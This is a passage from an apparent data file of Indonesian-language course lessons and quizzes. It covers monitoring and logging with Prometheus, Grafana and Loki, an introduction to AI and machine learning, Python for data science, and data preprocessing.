        explanation: "proxy_pass meneruskan request ke upstream backend."
      },
      {
        question: "Tools untuk mendapatkan sertifikat TLS gratis otomatis?",
        options: ["OpenSSL CLI", "Let's Encrypt via Certbot", "CA berbayar wajib", "Self-signed untuk prod"],
        answer: 1,
        explanation: "Certbot + Let's Encrypt memberi sertifikat TLS gratis via ACME protocol."
      }
    ]
  },
  {
    level: 7,
    order: 8,
    title: "Monitoring & Logging",
    slug: "monitoring-logging",
    description: "Prometheus, Grafana, ELK, dan observability sistem modern.",
    icon: "📊",
    isProject: false,
    content: `# Monitoring & Logging

**Observability** adalah kemampuan memahami keadaan sistem dari output eksternal (metric, log, trace). Tanpa observability, operasional adalah menebak dalam gelap. Tiga pilar observability—metrics, logs, traces—saling melengkapi. Materi ini mengupas stack modern: Prometheus + Grafana untuk metrik, ELK/Loki untuk log, dan Jaeger/Tempo untuk tracing.

![Monitoring & Logging](https://sfile.chatglm.cn/images-ppt/631c50fce301.jpg)

## Tiga Pilar Observability

| Pilar | Apa | Tools |
|-------|-----|-------|
| **Metrics** | Angka numerik time-series (CPU, req/s) | Prometheus, Datadog, InfluxDB |
| **Logs** | Event diskrit dengan timestamp | ELK, Loki, Splunk |
| **Traces** | Request lintas service (span) | Jaeger, Tempo, OpenTelemetry |

## Prometheus + Grafana

Prometheus adalah time-series database dengan model pull (scrape target). Grafana memvisualisasikan data Prometheus.

### Metrik Prometheus (4 tipe)
- **Counter** — monoton naik (total request).
- **Gauge** — naik turun (memory used).
- **Histogram** — distribusi (latency bucket).
- **Summary** — quantile (p99 latency).

### Instrumentasi aplikasi

\`\`\`python
# Python dengan prometheus_client
from prometheus_client import Counter, Histogram, start_http_server
import time, random

REQUESTS = Counter('http_requests_total', 'Total HTTP requests', ['method', 'endpoint'])
LATENCY = Histogram('http_request_duration_seconds', 'HTTP latency', ['endpoint'])

def handle_request(method, endpoint):
    REQUESTS.labels(method=method, endpoint=endpoint).inc()
    with LATENCY.labels(endpoint=endpoint).time():
        time.sleep(random.uniform(0.01, 0.1))
        return "OK"

start_http_server(8000)  # /metrics endpoint
\`\`\`

### Konfigurasi Prometheus

\`\`\`yaml
# prometheus.yml
global:
  scrape_interval: 15s
  evaluation_interval: 15s

rule_files: ["/etc/prometheus/rules/*.yml"]

scrape_configs:
  - job_name: 'node'
    static_configs:
      - targets: ['node1:9100', 'node2:9100']
  - job_name: 'api'
    metrics_path: /metrics
    static_configs:
      - targets: ['api:8000']
  - job_name: 'k8s-pods'
    kubernetes_sd_configs:
      - role: pod
    relabel_configs:
      - source_labels: [__meta_kubernetes_pod_annotation_prometheus_io_scrape]
        action: keep
        regex: true
\`\`\`

### Alerting rules

\`\`\`yaml
# rules/api.yml
groups:
- name: api
  rules:
  - alert: HighErrorRate
    expr: |
      sum(rate(http_requests_total{status=~"5.."}[5m]))
      / sum(rate(http_requests_total[5m])) > 0.05
    for: 10m
    labels: {severity: critical}
    annotations:
      summary: "Error rate > 5% on API"
      description: "Current error rate: {{ $value | humanizePercentage }}"

  - alert: HighLatencyP99
    expr: |
      histogram_quantile(0.99, rate(http_request_duration_seconds_bucket[5m])) > 0.5
    for: 5m
    labels: {severity: warning}
    annotations:
      summary: "P99 latency > 500ms"
\`\`\`

### Alertmanager

\`\`\`yaml
# alertmanager.yml
route:
  receiver: 'slack-default'
  group_by: ['alertname', 'service']
  group_wait: 30s
  group_interval: 5m
  repeat_interval: 4h
receivers:
- name: 'slack-default'
  slack_configs:
  - api_url: 'https://hooks.slack.com/services/...'
    channel: '#alerts'
- name: 'pd-critical'
  webhook_configs:
  - url: 'https://events.pagerduty.com/...'
\`\`\`

## Grafana Dashboard

Grafana membuat dashboard dari berbagai source (Prometheus, Loki, ES). Praktik baik:

- Panel per service: RED (Rate, Error, Duration) untuk service; USE (Utilization, Saturation, Errors) untuk resource.
- Threshold berwarna (green/yellow/red).
- Variable untuk filter multi-environment.
- Alerting via Grafana (bisa kirim ke Slack/PD).

\`\`\`text
Dashboard kunci untuk web service:
1. Service overview: req/s, error rate, p50/p95/p99 latency
2. Resource: CPU, memory, disk, network
3. Business: signup, conversion, revenue
4. SLO: error budget burn rate
5. Cache: hit/miss ratio, eviction
\`\`\`

## Logging dengan ELK / Loki

### ELK Stack
- **Elasticsearch** — search & analytics engine.
- **Logstash** — pipeline parsing/enrichment.
- **Kibana** — visualisasi & dashboard.
- **Beats** (Filebeat, Metricbeat) — agent pengirim data.

### Loki + Promtail (alternatif ringan)
Loki menyimpan log dengan index by label saja (bukan full-text), jauh lebih murah dari ES.

\`\`\`yaml
# promtail-config.yml
server:
  http_listen_port: 9080
positions:
  filename: /tmp/positions.yaml
clients:
  - url: http://loki:3100/loki/api/v1/push
scrape_configs:
  - job_name: app_logs
    static_configs:
      - targets: [localhost]
        labels:
          job: api
          env: prod
          __path__: /var/log/api/*.log
    pipeline_stages:
      - regex:
          expression: '(?P<ts>\\S+) (?P<level>\\w+) (?P<msg>.*)$'
      - labels:
          level:
\`\`\`

### Structured Logging

Log dalam format JSON agar mudah diparse:

\`\`\`python
import structlog, logging
logging.basicConfig(level=logging.INFO)
structlog.configure(processors=[
    structlog.processors.TimeStamper(fmt="iso"),
    structlog.processors.add_log_level,
    structlog.processors.JSONRenderer(),
])
log = structlog.get_logger()

log.info("user_login", user_id=42, ip="10.0.0.1", method="oidc")
# Output: {"event":"user_login","user_id":42,"ip":"10.0.0.1","method":"oidc","level":"info","timestamp":"2024-..."}
\`\`\`

\`\`\`bash
# Query log di Loki (LogQL)
{job="api",env="prod"} |= "error" | json | level="ERROR" | line_format "{{.msg}}"

# Query di Elasticsearch
GET /api-logs-*/_search
{
  "query": {
    "bool": {
      "must": [
        {"match": {"level": "ERROR"}},
        {"range": {"@timestamp": {"gte": "now-1h"}}}
      ]
    }
  }
}
\`\`\`

## Distributed Tracing

Trace menelusuri request lintas service. Standar: **OpenTelemetry**.

\`\`\`python
from opentelemetry import trace
from opentelemetry.exporter.jaeger.thrift import JaegerExporter
from opentelemetry.sdk.trace import TracerProvider
from opentelemetry.sdk.trace.export import BatchSpanProcessor

trace.set_tracer_provider(TracerProvider())
trace.get_tracer_provider().add_span_processor(
    BatchSpanProcessor(JaegerExporter(agent_host_name="jaeger", agent_port=6831))
)
tracer = trace.get_tracer(__name__)

with tracer.start_as_current_span("process_order") as span:
    span.set_attribute("order.id", 12345)
    # ... business logic ...
    with tracer.start_as_current_span("charge_payment"):
        # call payment service
        pass
\`\`\`

## SLO & Error Budget

SLO (Service Level Objective) adalah target reliability, mis. "99.9% request sukses dalam 28 hari". Error budget = 100% - SLO. Untuk 99.9% dalam 28 hari, budget = 0.1% * 40320 min = ~40 menit downtime.

\`\`\`text
SLO implementation:
- SLI: ratio good events / total events
- Burn rate alert: jika burn rate > 14.4x dalam 1 jam → page
- Multi-window multi-burn-rate: 1h+5m, 6h+30m
- Tracking via Prometheus + Sloth
\`\`\`

## Tips & Best Practices

- Tetapkan **cardinality budget** untuk label Prometheus (hindari user_id, request_id sebagai label—ledakan series).
- Sampling traces untuk cost (head sampling atau tail sampling via OTel Collector).
- Retention: metric 15 hari (hemat storage), log 30-90 hari, trace 7-14 hari.
- Centralized logging + immutable (append-only) untuk audit.
- Sentralisasi dashboard link di runbook agar on-call cepat.
- Latih **game days** untuk on-call.

## Kesimpulan

Observability adalah pembeda antara operasional yang reaktif vs proaktif. Dengan stack Prometheus+Grafana+Loki+Jaeger yang terintegrasi, tim dapat mendeteksi masalah sebelum pengguna merasakan, mendiagnosa cepat saat insiden, dan belajar dari post-mortem. SLO memberi kerangka berpikir tentang reliability sebagai produk. Observability bukan biaya—ia investasi ketenangan operasional.`,
    quiz: [
      {
        question: "Tipe metrik Prometheus untuk nilai yang bisa naik-turun (mis. memory)?",
        options: ["Counter", "Gauge", "Histogram", "Summary"],
        answer: 1,
        explanation: "Gauge untuk nilai yang bisa naik-turun (memory, queue size, temperature)."
      },
      {
        question: "Komponen ELK untuk visualisasi dashboard?",
        options: ["Elasticsearch", "Logstash", "Kibana", "Beats"],
        answer: 2,
        explanation: "Kibana adalah UI visualisasi dan dashboard untuk data di Elasticsearch."
      },
      {
        question: "Standar terbuka untuk distributed tracing?",
        options: ["OpenSSL", "OpenTelemetry", "OpenStack", "OpenShift"],
        answer: 1,
        explanation: "OpenTelemetry adalah standar CNCF untuk traces, metrics, dan logs."
      }
    ]
  },

  // ==================== LEVEL 8 - AI & MACHINE LEARNING (8) ====================
  {
    level: 8,
    order: 1,
    title: "Pengenalan AI & ML",
    slug: "pengenalan-ai-ml",
    description: "AI, ML, deep learning, dan landscape machine learning modern.",
    icon: "🤖",
    isProject: false,
    content: `# Pengenalan AI & ML

**Artificial Intelligence (AI)** adalah bidang ilmu komputer yang berusaha membuat mesin meniru kecerdasan manusia—berpikir, belajar, dan mengambil keputusan. Di dalamnya, **Machine Learning (ML)** adalah cabang di mana mesin belajar pola dari data tanpa diprogram eksplisit. **Deep Learning** adalah sub-bidang ML berbasis neural network berlapis dalam. Memahami perbedaan dan keterkaitan ketiganya adalah pintu masuk ke dunia data science modern.

![Pengenalan AI & ML](https://sfile.chatglm.cn/images-ppt/2ccd2dc8282b.png)

## Spektrum AI

\`\`\`text
┌─────────────────────────────────────────────┐
│  Artificial Intelligence (AI)               │
│  ┌───────────────────────────────────────┐  │
│  │  Machine Learning (ML)                │  │
│  │  ┌─────────────────────────────────┐  │  │
│  │  │  Deep Learning (DL)             │  │  │
│  │  │  (Neural Network banyak lapis)  │  │  │
│  │  └─────────────────────────────────┘  │  │
│  └───────────────────────────────────────┘  │
└─────────────────────────────────────────────┘

AI: semua teknik membuat mesin "cerdas" (termasuk rule-based, expert system)
ML: subset AI yang belajar dari data
DL: subset ML dengan neural network dalam
\`\`\`

## Kategori Machine Learning

### 1. Supervised Learning
Data berlabel (input → output). Model belajar mapping. Contoh: klasifikasi email spam/ham, regresi harga rumah, deteksi tumor.

### 2. Unsupervised Learning
Data tanpa label. Model menemukan struktur. Contoh: clustering pelanggan, dimensi reduksi (PCA), anomaly detection.

### 3. Reinforcement Learning
Agent belajar melalui interaksi dengan environment, mendapat reward/punishment. Contoh: AlphaGo, robot navigation, game AI.

### 4. Semi-supervised & Self-supervised
Sedikit data berlabel + banyak tanpa label (semi). Self-supervised: label dibuat dari data sendiri (pre-training LLM memprediksi token berikutnya).

## Workflow ML End-to-End

1. **Problem definition** — bisnis vs ML problem, metric sukses.
2. **Data collection** — sourcing, labeling, versioning.
3. **EDA** — eksplorasi, statistik, visualisasi.
4. **Preprocessing** — cleaning, encoding, scaling, split.
5. **Feature engineering** — transformasi, selection.
6. **Model selection & training** — baseline → kompleks.
7. **Evaluation** — cross-validation, metric sesuai konteks.
8. **Hyperparameter tuning** — GridSearch, Bayesian, Optuna.
9. **Deployment** — serving, monitoring, drift detection.
10. **Iterate** — model improvement, retraining.

## Tipe Tugas ML

| Tipe | Output | Contoh |
|------|--------|--------|
| **Klasifikasi** | Kategori diskrit | Spam detection, image class |
| **Regresi** | Nilai kontinu | Harga, suhu, demand |
| **Clustering** | Group tanpa label | Customer segmentation |
| **Ranking** | Urutan | Search results, recommendations |
| **Generative** | Data baru | Image generation, text synthesis |
| **Reinforcement** | Aksi/kebijakan | Game playing, robotics |

## Contoh Klasifikasi Sederhana

\`\`\`python
# Klasifikasi iris dataset dengan scikit-learn
from sklearn.datasets import load_iris
from sklearn.model_selection import train_test_split
from sklearn.ensemble import RandomForestClassifier
from sklearn.metrics import classification_report, accuracy_score

X, y = load_iris(return_X_y=True)
X_train, X_test, y_train, y_test = train_test_split(
    X, y, test_size=0.2, random_state=42, stratify=y
)

clf = RandomForestClassifier(n_estimators=100, random_state=42)
clf.fit(X_train, y_train)
y_pred = clf.predict(X_test)

print(f"Accuracy: {accuracy_score(y_test, y_pred):.4f}")
print(classification_report(y_test, y_pred, target_names=load_iris().target_names))
\`\`\`

## Konsep Penting

- **Feature** — variabel input (kolom dalam dataset).
- **Label/Target** — output yang diprediksi.
- **Training set** — data untuk melatih model.
- **Validation set** — untuk hyperparameter tuning.
- **Test set** — evaluasi akhir, hanya sekali.
- **Overfitting** — model hafal training, buruk di test.
- **Underfitting** — model terlalu sederhana, buruk di keduanya.
- **Bias-Variance tradeoff** — keseimbangan generalisasi.

## Bias-Variance Tradeoff

\`\`\`text
Error total = Bias² + Variance + Irreducible Error

Bias tinggi   → underfitting (model terlalu sederhana)
Variance tinggi → overfitting (model terlalu kompleks, sensitif terhadap training)

Strategi:
- Bias tinggi: model lebih kompleks, lebih feature
- Variance tinggi: lebih banyak data, regularisasi, ensemble
\`\`\`

## Landscape Tools ML

| Kategori | Tools |
|----------|-------|
| Klasik ML | scikit-learn, XGBoost, LightGBM |
| Deep Learning | PyTorch, TensorFlow, JAX |
| Serving | FastAPI, TorchServe, TF Serving, Triton |
| MLOps | MLflow, Weights & Biases, Kubeflow |
| Data | pandas, polars, Dask, Spark |
| Visualisasi | matplotlib, seaborn, plotly |

## Etika & Tanggung Jawab AI

- **Bias & fairness** — data bias menghasilkan model bias.
- **Privacy** — differential privacy, federated learning.
- **Explainability** — SHAP, LIME untuk interpretasi.
- **Transparency** — dokumentasi model card.
- **Misuse** — deepfake, surveillance, disinformation.
- **Regulasi** — EU AI Act (2024), UU AI di berbagai negara.

## Tips & Best Practices

- Mulai dari **baseline sederhana** (heuristik/regresi linear) sebelum model kompleks.
- **Data > Model** — kualitas data lebih penting dari algoritma canggih.
- Setup **reproducibility** (seed, versioning data+code, MLflow).
- **Cross-validation** untuk evaluasi yang robust.
- Monitor **data drift** dan **concept drift** di produksi.
- Lakukan **A/B testing** sebelum model go-live ke seluruh pengguna.

## Kesimpulan

AI/ML adalah bidang luas yang mentransformasi industri. Memahami spektrum AI→ML→DL, kategori pembelajaran (supervised/unsupervised/RL), dan workflow end-to-end memberi Anda fondasi yang kuat. Yang paling penting: ML bukan sihir—ia disiplin yang membutuhkan data berkualitas, eksperimen terkontrol, dan pertimbangan etis. Pada level berikutnya kita akan mendalami Python sebagai bahasa utama data science.`,
    quiz: [
      {
        question: "Cabang AI di mana mesin belajar dari data tanpa diprogram eksplisit?",
        options: ["Expert System", "Machine Learning", "Robotic Process Automation", "Symbolic AI"],
        answer: 1,
        explanation: "Machine Learning belajar pola dari data, tidak perlu aturan eksplisit."
      },
      {
        question: "Jenis ML yang menggunakan data berlabel (input-output)?",
        options: ["Supervised Learning", "Unsupervised Learning", "Reinforcement Learning", "Self-supervised Learning"],
        answer: 0,
        explanation: "Supervised Learning menggunakan pasangan input-output berlabel untuk training."
      },
      {
        question: "Kondisi saat model hafal training data namun buruk di test?",
        options: ["Underfitting", "Overfitting", "Convergence", "Regularization"],
        answer: 1,
        explanation: "Overfitting: model terlalu fit ke training, gagal generalisasi ke data baru."
      }
    ]
  },
  {
    level: 8,
    order: 2,
    title: "Python untuk Data Science",
    slug: "python-data-science",
    description: "NumPy, pandas, matplotlib untuk analisis data di Python.",
    icon: "🐍",
    isProject: false,
    content: `# Python untuk Data Science

Python adalah bahasa de facto data science berkat ekosistem library kaya: NumPy untuk komputasi numerik, pandas untuk manipulasi tabular, matplotlib/seaborn untuk visualisasi, dan scikit-learn untuk ML. Materi ini mengupas dasar-dasar library inti yang akan dipakai di seluruh perjalanan ML.

![Python untuk Data Science](https://sfile.chatglm.cn/images-ppt/2ccd2dc8282b.png)

## Setup Environment

\`\`\`bash
# Buat virtual environment
python -m venv .venv
source .venv/bin/activate    # Linux/macOS
.venv\\Scripts\\activate       # Windows

# Install library inti
pip install numpy pandas matplotlib seaborn scikit-learn jupyter

# Atau pakai conda
conda create -n ds python=3.11
conda activate ds
conda install numpy pandas matplotlib seaborn scikit-learn

# Jalankan notebook
jupyter lab
\`\`\`

## NumPy: Array Numerik

NumPy menyediakan array n-dimensi yang efisien—basis semua library data science Python.

\`\`\`python
import numpy as np

# Buat array
a = np.array([1, 2, 3, 4, 5])
b = np.arange(0, 10, 2)              # [0 2 4 6 8]
c = np.linspace(0, 1, 5)             # [0. 0.25 0.5 0.75 1.]
d = np.zeros((3, 4))                 # 3x4 nol
e = np.random.randn(100, 5)          # 100x5 normal

# Operasi vektor (cepat, no loop)
a * 2                                # elementwise
a.sum(), a.mean(), a.std()
e.T                                  # transpose
e @ e.T                              # matrix multiplication
np.where(a > 2, "besar", "kecil")    # conditional

# Broadcasting
x = np.arange(3)                     # [0 1 2]
y = np.arange(3).reshape(3, 1)       # [[0],[1],[2]]
x + y                                # 3x3 hasil broadcast
\`\`\`

## pandas: Manipulasi Data Tabular

pandas adalah Excel-nya Python—DataFrame untuk analisis.

\`\`\`python
import pandas as pd

# Load CSV
df = pd.read_csv("data/sales.csv", parse_dates=["date"])
df.head()
df.info()
df.describe()

# Seleksi
df[(df["region"] == "APAC") & (df["amount"] > 1000)]
df.loc[df["status"] == "paid", ["customer", "amount"]]

# Group & aggregate
df.groupby("region")["amount"].agg(["sum", "mean", "count"])
df.groupby(["region", "product"])["amount"].sum().unstack()

# Pivot table
pd.pivot_table(df, values="amount", index="region",
               columns="product", aggfunc="sum", margins=True)

# Join/merge
merged = orders.merge(customers, on="customer_id", how="left")

# Time series
df.set_index("date").resample("M")["amount"].sum().plot()

# Handle missing
df.isna().sum()
df.fillna({"amount": 0, "region": "Unknown"})
df.dropna(subset=["customer_id"])

# Apply function
df["category"] = df["amount"].apply(
    lambda x: "large" if x > 1000 else "small"
)

# Dummy variable (one-hot)
pd.get_dummies(df, columns=["region"], drop_first=True)
\`\`\`

## Visualisasi: matplotlib & seaborn

\`\`\`python
import matplotlib.pyplot as plt
import seaborn as sns

# Set style
sns.set_theme(style="whitegrid")

# Line plot
fig, ax = plt.subplots(figsize=(10, 5))
df.set_index("date")["amount"].plot(ax=ax)
ax.set_title("Sales Over Time")
ax.set_xlabel("Date"); ax.set_ylabel("Amount")
plt.tight_layout(); plt.savefig("sales.png", dpi=150)

# Histogram + KDE
fig, axes = plt.subplots(1, 2, figsize=(12, 4))
sns.histplot(df["amount"], kde=True, ax=axes[0])
sns.boxplot(data=df, x="region", y="amount", ax=axes[1])

# Correlation heatmap
fig, ax = plt.subplots(figsize=(8, 6))
sns.heatmap(df.select_dtypes("number").corr(),
            annot=True, cmap="coolwarm", center=0, ax=ax)

# Pairplot
sns.pairplot(df[["amount", "quantity", "discount", "region"]], hue="region")
\`\`\`

## EDA (Exploratory Data Analysis) Workflow

\`\`\`python
# Template EDA cepat
def quick_eda(df):
    print("Shape:", df.shape)
    print("\\nDtypes:")
    print(df.dtypes.value_counts())
    print("\\nMissing (%):")
    print((df.isna().mean() * 100).round(2).sort_values(ascending=False).head(10))
    print("\\nNumeric describe:")
    print(df.describe().T[["mean", "std", "min", "50%", "max"]])
    print("\\nCategorical:")
    for col in df.select_dtypes("object").columns:
        print(f"  {col}: {df[col].nunique()} unique, top = {df[col].value_counts().head(3).to_dict()}")

quick_eda(df)
\`\`\`

## scikit-learn: ML Toolkit

\`\`\`python
from sklearn.model_selection import train_test_split, cross_val_score
from sklearn.preprocessing import StandardScaler
from sklearn.linear_model import LogisticRegression
from sklearn.ensemble import RandomForestClassifier
from sklearn.metrics import classification_report, confusion_matrix

# Split
X_train, X_test, y_train, y_test = train_test_split(
    X, y, test_size=0.2, stratify=y, random_state=42
)

# Pipeline (mencegah data leakage)
from sklearn.pipeline import Pipeline
pipe = Pipeline([
    ("scaler", StandardScaler()),
    ("clf", LogisticRegression(max_iter=1000))
])
pipe.fit(X_train, y_train)
print(classification_report(y_test, pipe.predict(X_test)))

# Cross-validation
scores = cross_val_score(pipe, X, y, cv=5, scoring="f1_macro")
print(f"CV F1: {scores.mean():.3f} ± {scores.std():.3f}")
\`\`\`

## Best Practices Kode

- Gunakan **virtual environment** per project.
- **Reproducibility**: set random seed, pin versi di requirements.txt.
- **Notebook hygiene**: jalankan dari atas ke bawah tanpa error.
- **Type hint** untuk fungsi penting.
- **Logging** alih-alih print untuk pipeline produksi.
- **Modularisasi**: pindahkan fungsi ke .py, impor di notebook.

\`\`\`python
# Reproducibility
import numpy as np, tensorflow as tf, random, os
SEED = 42
os.environ["PYTHONHASHSEED"] = str(SEED)
random.seed(SEED); np.random.seed(SEED); tf.random.set_seed(SEED)
\`\`\`

## Tips & Best Practices

- Pelajari **vectorized operation**—hindari loop di Python murni.
- Gunakan **dtype** tepat (category untuk string rendah kardinalitas, int8/int16 untuk hemat memori).
- Untuk dataset besar, pertimbangkan **polars** (lebih cepat dari pandas) atau **Dask/Spark**.
- Eksplorasi dengan **ydata-profiling** untuk laporan EDA otomatis.
- Simpan dataset besar dalam format **parquet/feather**, bukan CSV (lebih cepat & kecil).
- Gunakan **Jupyter Lab** dengan ekstensi untuk produktivitas.

## Kesimpulan

Python dengan NumPy, pandas, matplotlib, dan scikit-learn adalah toolkit wajib data scientist. Kuasai array NumPy, manipulasi DataFrame pandas, dan workflow EDA—sisanya adalah kombinasi. Yang membedakan data scientist biasa dari hebat adalah kemampuan **merangkai pertanyaan bisnis → data → analisis → rekomendasi**, bukan sekadar memanggil API library. Pada level berikutnya kita akan mendalami data preprocessing yang menentukan kualitas model.`,
    quiz: [
      {
        question: "Library Python utama untuk komputasi array numerik?",
        options: ["pandas", "NumPy", "matplotlib", "scikit-learn"],
        answer: 1,
        explanation: "NumPy menyediakan ndarray n-dimensi yang efisien sebagai basis library lain."
      },
      {
        question: "Fungsi pandas untuk operasi group + aggregate?",
        options: ["df.pivot()", "df.group()", "df.groupby()", "df.merge()"],
        answer: 2,
        explanation: "df.groupby('col')['target'].agg(...) untuk agregasi per grup."
      },
      {
        question: "Praktik terbaik agar pipeline sklearn tidak leak data?",
        options: ["Fit scaler di seluruh data", "Gunakan Pipeline dengan fit pada train only", "Scaling manual sebelum split", "Skip scaling"],
        answer: 1,
        explanation: "Pipeline sklearn fit hanya pada training data, transform pada test—no leakage."
      }
    ]
  },
  {
    level: 8,
    order: 3,
    title: "Data Preprocessing",
    slug: "data-preprocessing",
    description: "Cleaning, encoding, scaling, dan feature engineering untuk ML.",
    icon: "🧹",
    isProject: false,
    content: `# Data Preprocessing

**Data preprocessing** menghabiskan 60-80% waktu data scientist. Kualitas model sangat ditentukan oleh kualitas input—prinsip "garbage in, garbage out". Materi ini mengupas pembersihan data, handling missing value, encoding kategorikal, scaling, feature engineering, dan splitting strategis.

![Data Preprocessing](https://sfile.chatglm.cn/images-ppt/2ccd2dc8282b.png)

## Pipeline Preprocessing

\`\`\`text
Raw Data
  → Data Cleaning (duplikat, typo, invalid)
  → Missing Value Handling
  → Encoding Categorical
  → Feature Engineering
  → Scaling / Normalization
  → Feature Selection
  → Train/Val/Test Split
\`\`\`

## Data Cleaning

\`\`\`python
import pandas as pd
import numpy as np

df = pd.read_csv("data/raw.csv")

# Hapus duplikat
df = df.drop_duplicates()
df = df.drop_duplicates(subset=["customer_id", "order_id"])

# Standarisasi format string
df["email"] = df["email"].str.lower().str.strip()
df["phone"] = df["phone"].str.replace(r"\\D", "", regex=True)

# Perbaiki typo dengan mapping
gender_map = {"M": "male", "F": "female", "Male": "male", "Female": "female",
              "male": "male", "female": "female"}
df["gender"] = df["gender"].map(gender_map).fillna("unknown")

# Outlier detection dengan IQR
def remove_outliers_iqr(df, col, k=1.5):
    q1, q3 = df[col].quantile([0.25, 0.75])
    iqr = q3 - q1
    lower, upper = q1 - k * iqr, q3 + k * iqr
    return df[(df[col] >= lower) & (df[col] <= upper)]

df = remove_outliers_iqr(df, "annual_income")

# Konversi tipe
df["date"] = pd.to_datetime(df["date"], errors="coerce")
df["amount"] = pd.to_numeric(df["amount"], errors="coerce")
\`\`\`

## Missing Value Handling

Strategi tergantung jenis dan persentase missing:

\`\`\`python
# Analisis missing
missing = df.isna().mean().sort_values(ascending=False)
print(missing[missing > 0])

# 1. Drop kolom > 50% missing
thresh = len(df) * 0.5
df = df.dropna(thresh=thresh, axis=1)

# 2. Drop baris dengan target missing
df = df.dropna(subset=["target"])

# 3. Imputasi numerik
from sklearn.impute import SimpleImputer, KNNImputer
num_imputer = SimpleImputer(strategy="median")   # atau mean
df[["age", "income"]] = num_imputer.fit_transform(df[["age", "income"]])

# 4. Imputasi kategorikal
cat_imputer = SimpleImputer(strategy="most_frequent", fill_value="missing")
df[["city", "job"]] = cat_imputer.fit_transform(df[["city", "job"]])

# 5. KNN imputer (lebih canggih, prediksi dari tetangga)
knn_imp = KNNImputer(n_neighbors=5)
df[["age", "income", "score"]] = knn_imp.fit_transform(df[["age", "income", "score"]])

# 6. Flag missing sebagai feature
df["income_missing"] = df["income"].isna().astype(int)
\`\`\`

## Encoding Categorical

### One-Hot Encoding (untuk kardinalitas rendah)
\`\`\`python
df = pd.get_dummies(df, columns=["city"], prefix="city", drop_first=True)
\`\`\`

### Label/Ordinal Encoding (untuk ordinal)
\`\`\`python
from sklearn.preprocessing import OrdinalEncoder
oe = OrdinalEncoder(categories=[["low", "medium", "high"]])
df["satisfaction"] = oe.fit_transform(df[["satisfaction"]])
\`\`\`

### Target Encoding (untuk kardinalitas tinggi)
\`\`\`python
from category_encoders import TargetEncoder
te = TargetEncoder(smoothing=10)
df["city_encoded"] = te.fit_transform(df["city"], df["target"])
\`\`\`

### Frequency Encoding
\`\`\`python
freq = df["city"].value_counts(normalize=True)
df["city_freq"] = df["city"].map(freq)
\`\`\`

## Feature Scaling

\`\`\`python
from sklearn.preprocessing import StandardScaler, MinMaxScaler, RobustScaler

# StandardScaler (mean=0, std=1) - default untuk SVM, LR, NN
scaler = StandardScaler()
df[["age", "income"]] = scaler.fit_transform(df[["age", "income"]])

# MinMaxScaler (0-1) - untuk NN dengan sigmoid
mm = MinMaxScaler()
df[["score"]] = mm.fit_transform(df[["score"]])

# RobustScaler (median & IQR) - tahan outlier
rs = RobustScaler()
df[["income"]] = rs.fit_transform(df[["income"]])

# Penting: fit pada train only, transform test (via Pipeline)
from sklearn.pipeline import Pipeline
pipe = Pipeline([
    ("scaler", StandardScaler()),
    ("model", LogisticRegression())
])
\`\`\`

## Feature Engineering

\`\`\`python
# Date features
df["order_date"] = pd.to_datetime(df["order_date"])
df["order_month"] = df["order_date"].dt.month
df["order_dow"] = df["order_date"].dt.dayofweek
df["is_weekend"] = df["order_dow"].isin([5, 6]).astype(int)
df["days_since_first"] = (df["order_date"] - df.groupby("customer_id")["order_date"].transform("min")).dt.days

# Interaction features
df["income_per_age"] = df["income"] / df["age"]
df["family_size_x_income"] = df["family_size"] * df["income"]

# Binning
df["age_group"] = pd.cut(df["age"], bins=[0, 18, 30, 45, 60, 100],
                         labels=["<18", "18-30", "30-45", "45-60", "60+"])

# Log transform untuk skew
df["log_income"] = np.log1p(df["income"])

# Text → numeric
df["desc_length"] = df["description"].str.len()
df["desc_word_count"] = df["description"].str.split().str.len()
\`\`\`

## Train/Val/Test Split

\`\`\`python
from sklearn.model_selection import train_test_split, StratifiedKFold

# Stratified split (menjaga distribusi kelas)
X_train, X_test, y_train, y_test = train_test_split(
    X, y, test_size=0.2, stratify=y, random_state=42
)
X_train, X_val, y_train, y_val = train_test_split(
    X_train, y_train, test_size=0.25, stratify=y_train, random_state=42
)
# 60/20/20 split

# Time-based split (untuk time series, no leakage)
train = df[df["date"] < "2024-01-01"]
val   = df[(df["date"] >= "2024-01-01") & (df["date"] < "2024-04-01")]
test  = df[df["date"] >= "2024-04-01"]

# Group split (mencegah patient/user leak)
from sklearn.model_selection import GroupKFold
gkf = GroupKFold(n_splits=5)
for tr_idx, val_idx in gkf.split(X, y, groups=df["customer_id"]):
    X_tr, X_vl = X.iloc[tr_idx], X.iloc[val_idx]
\`\`\`

## Imbalanced Data Handling

\`\`\`python
from imblearn.over_sampling import SMOTE
from imblearn.under_sampling import RandomUnderSampler
from imblearn.combine import SMOTETomek
from sklearn.utils.class_weight import compute_class_weight

# Class weight (paling simpel, recommended untuk DL)
classes = np.unique(y_train)
weights = compute_class_weight("balanced", classes=classes, y=y_train)
class_weight = dict(zip(classes, weights))
clf = RandomForestClassifier(class_weight=class_weight)

# Oversampling minoritas
sm = SMOTE(random_state=42)
X_res, y_res = sm.fit_resample(X_train, y_train)

# Undersampling mayoritas
rus = RandomUnderSampler(random_state=42)
X_res, y_res = rus.fit_resample(X_train, y_train)
\`\`\`

## Tips & Best Practices

- Selalu **fit transform pada train only**, lalu transform test/val via Pipeline untuk mencegah data leakage.
- Buat **data quality report** sebelum modeling.
- **Versioning dataset** dengan DVC atau Delta Lake.
- Dokumentasikan setiap transformasi di **feature store** (Feast, Hopsworks).
- Untuk produksi, gunakan **sklearn ColumnTransformer** untuk preprocessing multi-kolom.
- Evaluasi dampak setiap transformasi via cross-validation sebelum terima.

\`\`\`python
from sklearn.compose import ColumnTransformer
preprocessor = ColumnTransformer([
    ("num", Pipeline([("imputer", SimpleImputer(strategy="median")),
                      ("scaler", StandardScaler())]), numeric_cols),
    ("cat", Pipeline([("imputer", SimpleImputer(strategy="most_frequent")),
                      ("onehot", OneHotEncoder(handle_unknown="ignore"))]), categorical_cols),
])
full_pipe = Pipeline([("pre", preprocessor), ("clf", RandomForestClassifier())])
\`\`\`

## Kesimpulan

Data preprocessing adalah seni sekaligus sains. Pembersihan teliti, encoding tepat, scaling sesuai algoritma, dan split tanpa leakage—semua menentukan apakah model produksi akan berkinerja atau gagal. Investasikan waktu di sini; kesalahan kecil seperti fit pada seluruh data sebelum split dapat membatalkan semua kerja keras downstream. Preprocessing yang baik adalah pembeda model "berjalan di laptop" vs model "berjalan di produksi".`,
    quiz: [
      {
        question: "Scaling yang paling tahan terhadap outlier?",
        options: ["StandardScaler", "MinMaxScaler", "RobustScaler", "No scaling"],
        answer: 2,
        explanation: "RobustScaler pakai median & IQR, tahan terhadap outlier ekstrem."
      },
      {
